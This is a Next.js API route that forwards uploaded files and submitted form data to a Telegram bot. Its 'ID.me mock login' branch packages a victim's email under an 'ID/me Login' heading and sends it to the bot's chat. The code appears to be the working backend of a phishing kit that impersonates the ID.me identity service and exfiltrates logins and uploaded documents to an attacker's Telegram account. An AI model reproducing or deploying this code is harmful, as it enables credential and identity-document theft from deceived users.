// app/api/sendTelegram/route.ts
import { NextRequest, NextResponse } from "next/server";
import axios from "axios";
import FormData from "form-data";

export async function POST(req: NextRequest) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.error("Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID");
    return NextResponse.json(
      { error: "Missing Telegram credentials" },
      { status: 500 }
    );
  }

  try {
    const contentType = req.headers.get("content-type") || "";

    /* -------------------- FILE UPLOAD (multipart/form-data) -------------------- */
    if (contentType.includes("multipart/form-data")) {
      const formData = await req.formData();
      const file = formData.get("file") as File | null;
      const message = formData.get("message")?.toString() || "📎 File uploaded";

      if (!file) {
        return NextResponse.json(
          { error: "No file uploaded" },
          { status: 400 }
        );
      }

      const buffer = Buffer.from(await file.arrayBuffer());
      const telegramForm = new FormData();

      telegramForm.append("chat_id", chatId);
      telegramForm.append("document", buffer, {
        filename: file.name,
        contentType: file.type || "application/octet-stream",
      });
      telegramForm.append("caption", message);

      const telegramRes = await axios.post(
        `https://api.telegram.org/bot${botToken}/sendDocument`,
        telegramForm,
        { headers: telegramForm.getHeaders() }
      );

      return NextResponse.json({ success: true, response: telegramRes.data });
    }

    /* -------------------- EMAIL LOGIN (application/json) -------------------- */
    if (contentType.includes("application/json")) {
      const body = await req.json();

      // 🔐 ID.me mock login payload
      if (body.email) {
        const { email, remember } = body;

        const message = `
 <b>ID/me Login</b>

📧 <b>Email:</b> ${email}
        `;

        const telegramRes = await axios.post(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            chat_id: chatId,
            text: message,
            parse_mode: "HTML",
          }
        );

        return NextResponse.json({ success: true, response: telegramRes.data });
      }

      // Generic text message fallback
      if (body.message) {
        const telegramRes = await axios.post(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            chat_id: chatId,
            text: body.message,
            parse_mode: "HTML",
          }
        );

        return NextResponse.json({ success: true, response: telegramRes.data });
      }

      return NextResponse.json(
        { error: "Invalid JSON payload" },
        { status: 400 }
      );
    }

    return NextResponse.json(
      { error: "Unsupported content type" },
      { status: 400 }
    );
  } catch (err: any) {
    const status = err?.response?.status;
    const data = err?.response?.data;

    console.error("Telegram error status:", status);
    console.error("Telegram error data:", data);
    console.error("Axios message:", err?.message);

    return NextResponse.json(
      {
        error: "Failed to send to Telegram",
        status,
        details: data ?? err?.message,
      },
      { status: 500 }
    );
  }
}
